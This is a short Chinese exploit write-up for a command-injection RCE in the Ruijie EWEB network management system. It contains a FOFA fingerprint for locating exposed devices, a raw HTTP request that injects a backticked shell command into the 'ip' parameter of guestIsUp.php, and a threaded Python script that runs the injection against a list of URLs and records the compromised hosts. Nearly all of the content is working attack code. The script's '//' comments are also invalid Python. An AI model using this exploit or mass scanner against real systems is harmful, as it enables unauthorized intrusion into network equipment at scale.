# 锐捷-EWEB网管系统RCE

FOFA:

```
icon_hash="-692947551"
```

**EXP:**

```bash
POST /guest_auth/guestIsUp.php HTTP/1.1
Host: 127.0.0.1:9999
Connection: keep-alive
Content-Length: 45
Pragma: no-cache  
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://127.0.0.1:9999
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1:9999/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9  
 
mac=1&ip=`busybox ping -c 1 dnslog`

```

批量验证：


```python
# via：cHr1s
import requests
import threading
import threadpool
import random

//随机文件名
def random_str(randomlength=6):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    length = len(base_str) - 1
    for i in range(randomlength):
       random_str += base_str[random.randint(0, length)]
    return random_str

//批量检测
def RJ_RCE(url):
    name = ""+random_str()+".txt"
    payload = "|ls -al > "+name+""
    data = "mac=1&ip=127.0.0.1"+payload+"" 
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Cookie": "LOCAL_LANG_COOKIE=zh; sysmode=sys-mode%20gateway; UI_LOCAL_COOKIE=zh",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
       requests.packages.urllib3.disable_warnings()
       r = requests.post(url=url+'/guest_auth/guestIsUp.php',headers=headers,data=data,verify=False,timeout=30)
       rs = requests.get(url=url+'/guest_auth/'+name,headers=headers,verify=False)
       if name in rs.text:
         print('\n[ + ] successful: '+url+'/guest_auth/'+name+' [ + ]')
         with open('rjrce_success_url.txt','a') as f:
          f.write(url+'\n')
       else:
         print('\n[ - ] Some problems happened: '+url+' [ - ]')
    except:
       print('[ - ] Timeout: '+url+' [ - ]\n')

def main():
    with open('url.txt','r') as f:
       lines = f.read().splitlines()
       pool = threadpool.ThreadPool(5)
       requests = threadpool.makeRequests(RJ_RCE,lines)
    for req in requests:
       pool.putRequest(req)
       pool.wait()

if __name__ == '__main__':
    main()

```

ref:

https://forum.ywhack.com/thread-114888-1-1.html
